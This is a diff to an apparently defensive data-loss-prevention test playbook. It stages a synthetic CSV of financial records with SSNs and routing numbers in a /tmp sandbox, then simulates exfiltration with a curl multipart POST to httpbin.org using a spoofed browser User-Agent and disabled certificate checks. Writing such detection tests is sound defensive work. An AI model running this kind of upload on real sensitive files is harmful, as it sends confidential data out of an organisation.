@@ -53,7 +53,7 @@ steps:
   - id: "step-01"
     name: "Stage confidential Q4 financial report with PII"
     command: |
-      mkdir -p /tmp/cortex_dlp_saas
+      rm -rf /tmp/cortex_dlp_saas && mkdir -m 700 /tmp/cortex_dlp_saas || { echo "sandbox /tmp/cortex_dlp_saas could not be created fresh: something else is at that path" >&2; exit 1; }
       cat << 'EOF' > /tmp/cortex_dlp_saas/q4_unreleased_financials.csv
       Account_ID,Client_Name,Q4_Revenue,SSN,Tax_ID,Wire_Routing
       CORP-901,MegaCorp Inc,$14,500,000,987-65-4320,12-3456789,021000021
@@ -72,6 +72,7 @@ steps:
   - id: "step-02"
     name: "Simulate HTTPS multipart upload to external storage service"
     command: |
+      [ "$(stat -c %F:%u:%a /tmp/cortex_dlp_saas 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortex_dlp_saas is missing or not ours: step-01 did not complete" >&2; exit 1; }
       curl -sk -X POST -F "file=@/tmp/cortex_dlp_saas/q4_unreleased_financials.csv" \
         -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
         https://httpbin.org/post || true
